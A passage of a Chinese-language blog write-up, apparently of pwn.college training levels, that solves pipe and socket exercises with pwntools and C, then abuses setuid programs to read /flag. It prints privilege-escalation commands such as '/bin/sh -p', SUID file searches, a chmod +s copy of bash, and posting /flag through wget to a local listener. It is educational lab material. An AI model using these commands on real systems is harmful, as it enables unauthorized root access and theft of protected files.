class="hljs-built_in">cat</span>，再给t1</span><br></code></pre></td></tr></table></figure><p>​pwntools也行，参考level 134，基本一样，修改下p1即可</p><h2 id="level-134"><a class="markdownIt-Anchor" href="#level-134"></a> level 134</h2><blockquote><p>python中通过创建管道来进行通过cat的输入输出</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># python脚本</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br>r1,w1=os.pipe()  <span class="hljs-comment"># 一个管道的读端与写端</span><br>p0 = process([<span class="hljs-string">&quot;cat&quot;</span>], stdin=subprocess.PIPE, stdout=w1)<br>r2,w2=os.pipe()<br>p1 = process([<span class="hljs-string">&quot;/challenge/embryoio_level134&quot;</span>],stdin=r1, stdout=w2)<br>p2 = process([<span class="hljs-string">&quot;cat&quot;</span>], stdin=r2, stdout=subprocess.PIPE)<br>context.log_level=<span class="hljs-string">&#x27;info&#x27;</span>  <span class="hljs-comment">#info级别以上的日志会被打印</span><br>p2.recvuntil(<span class="hljs-string">b&quot;you will need to compute responses for.\n&quot;</span>)<br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        text = p2.recv(<span class="hljs-number">1024</span>, timeout=<span class="hljs-number">1</span>).decode(<span class="hljs-string">&quot;utf-8&quot;</span>)  <span class="hljs-comment"># 接收子进程的输出</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Please send the solution for:&quot;</span> <span class="hljs-keyword">in</span> text:<br>            exp = text[text.find(<span class="hljs-string">&quot;:&quot;</span>)+<span class="hljs-number">2</span>:-<span class="hljs-number">1</span>]  <span class="hljs-comment"># 获取表达式</span><br>            res = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">eval</span>(exp))  <span class="hljs-comment"># 执行表达式</span><br>            log.info(<span class="hljs-string">f&quot;result is: <span class="hljs-subst">&#123;res&#125;</span>&quot;</span>)  <span class="hljs-comment"># 打印执行的结果</span><br>            p0.sendline(res)  <span class="hljs-comment"># 将结果发送给子进程</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;pwn&quot;</span> <span class="hljs-keyword">in</span> text:<br>                text += p1.recvall().decode(<span class="hljs-string">&quot;utf-8&quot;</span>)  <span class="hljs-comment">#接收子进程的全部内容</span><br>                log.success(text[text.find(<span class="hljs-string">&quot;pwn.college&#123;&quot;</span>):-<span class="hljs-number">1</span>])  <span class="hljs-comment"># 打印flag</span><br>                <span class="hljs-keyword">break</span><br><span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    log.error(<span class="hljs-string">f&quot;Error: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="level-135"><a class="markdownIt-Anchor" href="#level-135"></a> level 135</h2><p>​跟shell脚本一样，直接利用pwntools里的 <code>r = process([&quot;./a&quot;])</code> 来运行就可以了</p><h2 id="level-139"><a class="markdownIt-Anchor" href="#level-139"></a> level 139</h2><p>​套用level 126的脚本呢，然后<code>echo 'cat &lt; t2 | ./a | cat &gt; t1 &amp; python c.py' &gt; b.sh</code>，运行b.sh就行，不知道为什么pwntools使用cat会卡住，没有成功</p><h2 id="level-140"><a class="markdownIt-Anchor" href="#level-140"></a> level 140</h2><blockquote><p>使用c程序来实现套接字连接，然后歪路使用c模拟bash，具体怎么模拟看level 70-71</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SERVER_IP <span class="hljs-string">&quot;0.0.0.0&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SERVER_PORT 1564</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BUFFER_SIZE 1024</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> sockfd;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">server_addr</span>;</span><br>    <span class="hljs-type">char</span> buffer[BUFFER_SIZE];<br>    <span class="hljs-type">char</span> ans[BUFFER_SIZE];<br>    <span class="hljs-comment">// 创建套接字</span><br>    sockfd = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (sockfd == <span class="hljs-number">-1</span>) &#123;<br>        perror(<span class="hljs-string">&quot;socket&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-comment">// 设置服务器地址</span><br>    server_addr.sin_family = AF_INET;<br>    server_addr.sin_addr.s_addr = inet_addr(SERVER_IP);<br>    server_addr.sin_port = htons(SERVER_PORT);<br><br>    <span class="hljs-comment">// 连接到服务器</span><br>    <span class="hljs-keyword">if</span> (connect(sockfd, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;server_addr, <span class="hljs-keyword">sizeof</span>(server_addr)) == <span class="hljs-number">-1</span>) &#123;<br>        perror(<span class="hljs-string">&quot;connect&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-built_in">memset</span>(buffer, <span class="hljs-number">0</span>, BUFFER_SIZE);<br>        <span class="hljs-keyword">if</span> (recv(sockfd, buffer, BUFFER_SIZE, <span class="hljs-number">0</span>) == <span class="hljs-number">-1</span>) &#123;<br>            perror(<span class="hljs-string">&quot;recv&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strlen</span>(buffer)&gt;<span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Received: %s\n&quot;</span>, buffer);<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">memcmp</span>(<span class="hljs-string">&quot;[TEST] CHALLENGE! Please send the solution&quot;</span>,buffer,<span class="hljs-built_in">strlen</span>((<span class="hljs-string">&quot;[TEST] CHALLENGE! Please send the solution&quot;</span>))))<br>            &#123;<br>                <br>                <span class="hljs-built_in">memset</span>(ans, <span class="hljs-number">0</span>, BUFFER_SIZE);<br>                read(<span class="hljs-number">0</span>,ans,BUFFER_SIZE);<br>                <span class="hljs-keyword">if</span> (send(sockfd, ans, <span class="hljs-built_in">strlen</span>(ans), <span class="hljs-number">0</span>) == <span class="hljs-number">-1</span>) &#123;<br>                    perror(<span class="hljs-string">&quot;send&quot;</span>);<br>                    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>                &#125;<br>            &#125;<br><br>        &#125;<br>    &#125;<br>    close(sockfd);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="level-141"><a class="markdownIt-Anchor" href="#level-141"></a> level 141</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;0.0.0.0&quot;</span>,<span class="hljs-number">1418</span>)  <span class="hljs-comment">#当客户端尝试连接到 0.0.0.0 时，它通常表示客户端将尝试连接到本地网络中的所有可用服务器。这里127.0.0.1也可以</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="level-142"><a class="markdownIt-Anchor" href="#level-142"></a> level 142</h2><p>​这里代码仿照 level 140，但是套接字的代码也需要函数 <code>pwncollege</code></p><h1 id="program-misuse"><a class="markdownIt-Anchor" href="#program-misuse"></a> Program Misuse</h1><blockquote><p>相关介绍:<a href="https://www.cnblogs.com/limingluzhu/p/5702486.html">Linux内核学习笔记： uid之ruid，euid，suid</a></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">/bin/sh -p # 这将会保存权限，他就是提权指令，得到一个新的shell(提权成功就是root了)<br><span class="hljs-meta prompt_"># </span><span class="language-bash">以下命令将尝试查找具有 root 权限的 SUID 的文件，不同系统适用于不同的命令</span><br>find / -perm -u=s -type f 2&gt;/dev/null<br>find / -user root -perm -4000-print 2&gt;/dev/null<br>find / -user root -perm -4000-exec ls -ldb &#123;&#125; ;<br>find / -type f -perm -04000 -ls 2&gt;/dev/null<br></code></pre></td></tr></table></figure><h2 id="level-11-2"><a class="markdownIt-Anchor" href="#level-11-2"></a> level 11</h2><ul><li><code>od -w100 -c /flag | sed ‘s# ##g’</code><ul><li>这里的 <code>-w100</code> 指每行显示100个字节，<code>-c</code> 以字符形式显示sed工具可以进行文本替换，<code>s</code> 表示替换，<code>#</code> 是分隔符，<code>##</code> 表示要替换的内容为空字符串，<code>g</code> 表示全局替换，即一行中的所有匹配都替换。</li><li>这里注意管道符的作用，它将前面的输出作为后面的输出，进行更改之后再向shell中输出</li></ul></li></ul><h2 id="level-12"><a class="markdownIt-Anchor" href="#level-12"></a> level 12</h2><ul><li><p><code>hexdump -C /flag | awk -F &quot;|&quot; '&#123;print $2&#125;' | xargs | sed &quot;s# ##g&quot;</code></p><ul><li><code>awk -F &quot;|&quot; '&#123;print $2&#125;'</code> ，awk用于处理上一个语句的输出，使用 <code>“|”</code> 作为字段分隔符，并打印第二个字段，这里就是按照 | 把每行分成了3份。这里就是把两个 | 中的语句提取出来打印</li><li><code>xargs</code> 构建并执行来自标准输入的命令行，就是从标准输入中得到数据。这里就是获取<code>awk</code> 的数据，将其作为参数传递给下一个命令 —&gt; <a href="https://www.notion.so/Linux-5f53968518a54ccbb605d10a1b177e3a?pvs=21">注意它与管道符的区别</a></li><li><code>sed &quot;s# ##g&quot;</code> 全局替换空格为无，这里首先使用 <code>xargs</code> 把内容输入到 <code>sed</code> 中，之后再进行处理</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@program-misuse-level-12:/challenge$ hexdump -C /flag <br>00000000  70 77 6e 2e 63 6f 6c 6c  65 67 65 7b 63 44 64 55  |pwn.college&#123;cDdU|<br>00000010  48 34 43 66 4d 76 4a 6a  45 44 5a 6f 55 32 79 56  |H4CfMvJjEDZoU2yV|<br>00000020  61 41 5a 6d 6c 37 57 2e  30 46 4e 31 45 44 4c 30  |aAZml7W.0FN1EDL0|<br>00000030  63 44 4d 7a 51 7a 57 7d  0a                       |cDMzQzW&#125;.|<br>00000039<br><br>hacker@program-misuse-level-12:/challenge$ hexdump -C /flag | awk -F<span class="hljs-string">&quot;|&quot;</span> <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span> <br>pwn.college&#123;cDdU<br>H4CfMvJjEDZoU2yV<br>aAZml7W.0FN1EDL0<br>cDMzQzW&#125;.<br><br>hacker@program-misuse-level-12:/challenge$ hexdump -C /flag | awk -F<span class="hljs-string">&quot;|&quot;</span> <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs | sed <span class="hljs-string">&quot;s# ##g&quot;</span><br>pwn.college&#123;cDdUH4CfMvJjEDZoU2yVaAZml7W.0FN1EDL0cDMzQzW&#125;.<br></code></pre></td></tr></table></figure></li></ul><h2 id="level-13"><a class="markdownIt-Anchor" href="#level-13"></a> level 13</h2><ul><li><p><code>echo $(xxd -p /flag) | xxd -r -p</code> —&gt; <code>xxd -p /flag | xxd -r -p</code></p><ul><li>使用<code>xxd -p /flag</code>生成连续的十六进制输出。<code>xxd</code>是一个将二进制文件转换为十六进制表示的工具，<code>-p</code>选项使其生成连续的十六进制输出</li><li>使用<code>echo</code>将输出传递给下一个命令。这里<code>echo $&#123; &#125;</code>da会先处理 <code>&#123; &#125;</code>，并将其结果输出出来 。</li><li>使用<code>xxd -r -p</code>将十六进制转换为ASCII。<code>xxd -r -p</code>会将十六进制字符串转换回原始的二进制数据。这里的二进制数据实际上只包含了ASCII字符的字节，那么转化后就会得到ascii字符</li><li>之后进行实验，不适用 <code>echo</code> 也可以</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@program-misuse-level-13:/challenge$ xxd /flag<br>00000000: 7077 6e2e 636f 6c6c 6567 657b 7761 6f39  pwn.college&#123;wao9<br>00000010: 4d74 386a 6d36 7342 6c30 7644 4338 7672  Mt8jm6sBl0vDC8vr<br>00000020: 6374 4a49 4a6f 332e 3056 4e31 4544 4c30  ctJIJo3.0VN1EDL0<br>00000030: 6344 4d7a 517a 577d 0a                   cDMzQzW&#125;.<br><br>hacker@program-misuse-level-13:/challenge$ xxd -p /flag<br>70776e2e636f6c6c6567657b77616f394d74386a6d3673426c3076444338<br>767263744a494a6f332e30564e3145444c3063444d7a517a577d0a<br><br>hacker@program-misuse-level-13:/challenge$ <span class="hljs-built_in">echo</span> $(xxd -p /flag)<br>70776e2e636f6c6c6567657b77616f394d74386a6d3673426c3076444338 767263744a494a6f332e30564e3145444c3063444d7a517a577d0a<br><br>hacker@program-misuse-level-13:/challenge$ <span class="hljs-built_in">echo</span> $(xxd -p /flag) | xxd -r -p<br>pwn.college&#123;wao9Mt8jm6sBl0vDC8vrctJIJo3.0VN1EDL0cDMzQzW&#125;<br><br>hacker@program-misuse-level-13:/challenge$ xxd -p /flag | xxd -r -p<br>pwn.college&#123;wao9Mt8jm6sBl0vDC8vrctJIJo3.0VN1EDL0cDMzQzW&#125;<br></code></pre></td></tr></table></figure></li></ul><h2 id="level-19"><a class="markdownIt-Anchor" href="#level-19"></a> level 19</h2><ul><li><code>zip tmp.zip /flag; unzip -p tmp.zip</code><ul><li><code>zip tmp.zip /flag</code> 将 <code>/flag</code> 压缩到 <code>tmp.zip</code> 文件中</li><li><code>unzip -p tmp.zip</code> 解压缩并标准输出</li></ul></li></ul><h2 id="level-20"><a class="markdownIt-Anchor" href="#level-20"></a> level 20</h2><ul><li><code>tar xf /flag -I '/bin/sh -c &quot;cat 1&gt;&amp;2&quot;'</code></li><li>或者 <code>tar cf  flag.tar /flag; tar -Oxf /flag.tar</code></li></ul><h2 id="level-24-31"><a class="markdownIt-Anchor" href="#level-24-31"></a> level 24-31</h2><p>​这个区间的题都可以看下面的网站 <code>GTFOBins</code> ，它里面包含操作具有SUID位的命令进入root shell的指令，直接运行就可以了。这里是对于每个命令的<a href="https://www.freebuf.com/articles/database/321219.html">分析</a>。</p><h2 id="level-32-2"><a class="markdownIt-Anchor" href="#level-32-2"></a> level 32</h2><blockquote><p>socat的使用</p></blockquote><ul><li><code>socat -u &quot;file:/flag&quot; -</code> / <code>socat - /flag</code><ul><li><code>-u</code>: 表示无缓存模式，在这个模式下，数据将立即传递而无需等待缓冲区填满</li><li><code>&quot;file:/flag&quot;</code>: 这是 socat 的源地址，指定了要连接的文件路径。在这里，<code>/flag</code> 是文件路径。</li><li><code>-</code>: 这是 socat 的目标地址，表示将数据发送到标准输出(stdout)</li><li>这个命令的作用是将文件 <code>/flag</code> 的内容通过无缓冲模式输出到标准输出</li></ul></li></ul><h2 id="level-33"><a class="markdownIt-Anchor" href="#level-33"></a> level 33</h2><blockquote><p>whiptail 是一个在 shell 脚本中创建对话框的工具，它通常用于创建用户友好的文本界面</p></blockquote><ul><li><code>whiptail --textbox &quot;/flag&quot; 20 60</code><ul><li><code>whiptail</code> 用于在 shell 脚本中创建对话框</li><li><code>--textbox &quot;/flag&quot;</code>: 指定要在对话框中显示的文件路径为 “/flag”。<code>--textbox</code> 选项告诉 <code>whiptail</code> 显示文件内容。</li><li><code>20 60</code>: 这两个参数分别指定了对话框的高度和宽度。在这里，高度为20行，宽度为60列。</li></ul></li></ul><h2 id="level-34"><a class="markdownIt-Anchor" href="#level-34"></a> level 34</h2><p>​<code>awk</code> 主要用于从文本文件或数据流中提取和处理数据。它的工作原理是基于模式匹配和动作的规则。用户可以指定一组模式(类似于正则表达式)，当这些模式匹配输入行时，相应的动作将被执行。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">pattern是模式，用于匹配输入数据的行，&#123;action&#125;是与模式匹配的行要执行的动作</span><br>awk &#x27;pattern &#123; action &#125;&#x27; file<br><span class="hljs-meta prompt_"># </span><span class="language-bash">打印文件中包含关键字<span class="hljs-string">&quot;error&quot;</span>的行</span><br>awk &#x27;/error/ &#123; print &#125;&#x27; logfile.txt<br></code></pre></td></tr></table></figure><ul><li><code>awk '&#123;print&#125;' /flag</code></li></ul><h2 id="level-35"><a class="markdownIt-Anchor" href="#level-35"></a> level 35</h2><p>​<code>sed</code>(Stream Editor)是一个用于对文本进行流式编辑的工具，它可以读取文件内容并对其进行各种文本转换操作。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">打印文件内容</span><br>sed &#x27;p&#x27; filename.txt<br><span class="hljs-meta prompt_"># </span><span class="language-bash">替换文本，将old替换为new，/g表示为全局。补充：在vim中，可以使用 :%s/old/new/g来进行替换</span><br>sed &#x27;s/old-text/new-text/g&#x27; filename.txt<br><span class="hljs-meta prompt_"># </span><span class="language-bash">这里就是直接省略标签，然后跳转到末尾，这样就全部显示出标准输出了</span><br>sed b -&gt; b label  Branch to label; if label is omitted, branch to end of script.<br><span class="hljs-meta prompt_"># </span><span class="language-bash">删除行</span><br>sed &#x27;/pattern/d&#x27; filename.txt<br></code></pre></td></tr></table></figure><ul><li><code>sed 'p' /flag</code></li></ul><h2 id="level-36"><a class="markdownIt-Anchor" href="#level-36"></a> level 36</h2><p>​<code>ed</code> 是一个文本编辑器，它以交互方式在终端中工作。类似于 vim，不过规则与显示不同</p><ul><li><code>ed /flag</code> 之后再输入 <code>1,$p</code> 打印整个文件的内容，<code>p</code> 打印当前行的内容。之后按 <code>q</code> 退出。</li></ul><h2 id="level-37"><a class="markdownIt-Anchor" href="#level-37"></a> level 37</h2><p>​<code>chown</code> 命令改变某个文件或目录的所有者和所属的组，该命令可以向某个用户授权，使该用户变成指定文件的所有者或者改变文件所属的组。用户可以是用户或者是用户D，用户组可以是组名或组id。文件名可以使由空格分开的文件列表，在文件名中可以包含通配符。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">hacker@program-misuse~level37:~$ chown -c hacker /flag<br>changed ownership of &#x27;/flag&#x27; from root to hacker<br></code></pre></td></tr></table></figure><h2 id="level-38"><a class="markdownIt-Anchor" href="#level-38"></a> level 38</h2><p>​<code>chmod </code>命令可以通过符号组合的方式更改目标文件或目录的权限。通过八进制数的方式更改目标文件或目录的权限。通过参考文件的权限来更改目标文件或目录的权限。这里直接赋予 777 权限。</p><h2 id="level-39"><a class="markdownIt-Anchor" href="#level-39"></a> level 39</h2><ul><li><code>cp /flag /dev/stdout</code><ul><li><code>/dev/stdout</code> 是一个特殊的文件路径，代表标准输出(stdout)设备。如果将输出写入 <code>/dev/stdout</code>，效果与直接在终端上显示输出相同。</li></ul></li></ul><h2 id="level-40"><a class="markdownIt-Anchor" href="#level-40"></a> level 40</h2><blockquote><p>这里有点歪门邪道，记住challenge给与suid权限，但是它是赋予该名称权限而不检查它的二进制文件内容</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell">hacker@program-misuse~level40:~$ mv /flag /usr/bin/mv  #这里就是用/flag的内容替换了mv的二进制文件<br>hacker@program-misuse~level40:~$ /challenge/babysuid_level40 #它赋予权限也是赋予相应名称文件，不检查文件到底是什么<br>Welcome to /challenge/babysuid_level40!<br><br>This challenge is part of a series of programs that<br>let you get the flag by doing tricks with permissions.<br><br>I just set the SUID bit on /usr/bin/mv.<br>Try to use it to read the flag!<br><br>IMPORTANT: make sure to run me (/challenge/babysuid_level40) every time that you restart<br>this challenge container to make sure that I set the SUID bit on /usr/bin/mv!<br>hacker@program-misuse~level40:~$ cat /usr/bin/mv<br></code></pre></td></tr></table></figure><h2 id="level-41-2"><a class="markdownIt-Anchor" href="#level-41-2"></a> level 41</h2><p>​<code>Perl</code> 命令行工具通常用于执行一行Perl代码，而不需要编写完整的Perl脚本。</p><ul><li><code>perl -ne 'print if /pwn/' /flag</code></li></ul><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gauss">perl -<span class="hljs-keyword">ne</span> &#x27;<span class="hljs-keyword">print</span> <span class="hljs-keyword">if</span> /pattern/&#x27; filename.txt<br><span class="hljs-meta"># -e 允许在命令行中直接提供perl代码</span><br><span class="hljs-meta"># -n 使Perl在每行上执行给定的代码，这里的代码是打印包含指定模式的行。</span><br></code></pre></td></tr></table></figure><h2 id="level-42"><a class="markdownIt-Anchor" href="#level-42"></a> level 42</h2><blockquote><p>执行python代码即可</p></blockquote><ul><li><code> python -c 'print(open(&quot;/flag&quot;).read())'</code></li></ul><h2 id="level-43"><a class="markdownIt-Anchor" href="#level-43"></a> level 43</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">hacker@program-misuse~level43:~$ ruby -e &#x27;puts File.read(&quot;/flag&quot;)&#x27;<br>Traceback (most recent call last):<br>ruby: no -e allowed while running setuid (SecurityError)#这里是ruby具有suid，然后为了保护不让用-e来执行，所以需要单独写一个脚本来执行命令<br>hacker@program-misuse~level43:~$ echo &#x27;puts File.read(&quot;/flag&quot;)&#x27; &gt; a.rb<br>hacker@program-misuse~level43:~$ ruby a.rb<br></code></pre></td></tr></table></figure><h2 id="level-44-2"><a class="markdownIt-Anchor" href="#level-44-2"></a> level 44</h2><ul><li><code>bash -p</code> 提权然后为root权限</li></ul><h2 id="level-45"><a class="markdownIt-Anchor" href="#level-45"></a> level 45</h2><p>​<code>date</code> 原来的作用是显示当前时间或者将时间按格式输出，但是用<code>-f</code>可以读取文件，如果文件内容不是正常的日期，则会回显出来。</p><ul><li><code>date -f /flag</code></li></ul><h2 id="level-46"><a class="markdownIt-Anchor" href="#level-46"></a> level 46</h2><p>​<code>dmesg</code> 被用于检查和控制内核的环形缓冲区。kernel会将开机信息存储在ring buffer中。若是开机时来不及查看信息，可利用dmesg来查看。开机信息保存在 /var/log/dmesg 文件里。</p><ul><li><code>dmesg -F /flag</code></li></ul><h2 id="level-47"><a class="markdownIt-Anchor" href="#level-47"></a> level 47</h2><p>​<code>wc</code> 原作用是统计文件的字节数、字数、行数。但是通过<code>--files0-from</code>参数可以从文件中读取文件名，所以如果文件内容不是一个正常的文件名的话就会回显出来</p><ul><li><code>wc --files0-from=/flag</code></li></ul><h2 id="level-48-2"><a class="markdownIt-Anchor" href="#level-48-2"></a> level 48</h2><ul><li><p><code>gcc -x c -E /flag</code></p><ul><li><code>-x c</code>: 指定输入文件的语言为C语言。这是为了确保 <code>gcc</code> 正确地识别输入文件 <code>/flag</code> 的语言类型。<code>-x</code> 选项后跟语言名称，这里是 “c”。</li><li><code>-E</code>: 该选项告诉编译器只进行预处理而不进行编译、汇编和链接。预处理是一个处理源代码的阶段，它包括宏展开、文件包含等操作，生成的结果通常是一个纯文本的C源代码，而不是编译后的目标文件。</li></ul></li><li><p><code>gcc -x assembler /flag</code></p><ul><li>这个以汇编形式报错展示，这里assembler也可以换成c，也会以报错显示出来文件内容</li></ul></li></ul><h2 id="level-49"><a class="markdownIt-Anchor" href="#level-49"></a> level 49</h2><p>​<code>as</code> 是GNU组织推出的一款汇编语言编译器，它支持多种不同类型的处理器。报错会回显问文件信息。</p><ul><li><code>as /flag</code> 这里 <code>as @/flag</code>可以去除一些杂乱信息</li></ul><h2 id="level-50"><a class="markdownIt-Anchor" href="#level-50"></a> level 50</h2><ul><li><code>nc -lp 8888 &amp; wget -bv --post-file=/flag http://127.0.0.1:8888</code><ul><li><code>nc -lp 8888 &amp;</code>: 启动一个在本地监听端口 <code>8888</code> 上的 netcat 服务。<code>-l</code> 表示监听模式，<code>-p 8888</code> 指定端口号为 <code>8888</code>，<code>&amp;</code> 表示将命令放到后台运行。</li><li><code>wget -bv --post-file=/flag http://127.0.0.1:8888</code>: 使用 <code>wget</code> 命令向指定的地址发送一个 POST 请求，将 <code>/flag</code> 文件的内容作为 POST 数据发送给 <code>http://127.0.0.1:8888</code>。这里 b 指后台运行，v指展示详细信息，这两个都可以不加。</li></ul></li><li>这里就是通过wget将flag通过网络传输到本机的一个端口，然后使用nc来将接收到的数据输出到标准输出中</li></ul><h2 id="level-51"><a class="markdownIt-Anchor" href="#level-51"></a> level 51</h2><blockquote><p>这里利用的就是suid提权之so文件注入</p></blockquote><h3 id="基础知识"><a class="markdownIt-Anchor" href="#基础知识"></a> 基础知识</h3><p>​原理：某些程序运行时候，有着管理员权限，却可以被任何用户调用，这就是suid权限。如果这个suid程序调用了某些shared object，可以通过伪造shared object，来伪造命令。以该程序的root权限，去执行提权命令。<br /><code>cp /bin/bash /tmp/bash &amp;&amp; chmod +s /tmp/bash &amp;&amp; /tmp/bash -p</code>。注意，suid权限必须是二进制程序才能用，脚本程序是无效的。</p><ol><li><p><code>ssh-keygen</code> 可以使用 -D 参数直接运行任意的共享库。如果有suid的话就能运行我们的恶意代码造成提权，共享库的创建方式见下方</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span 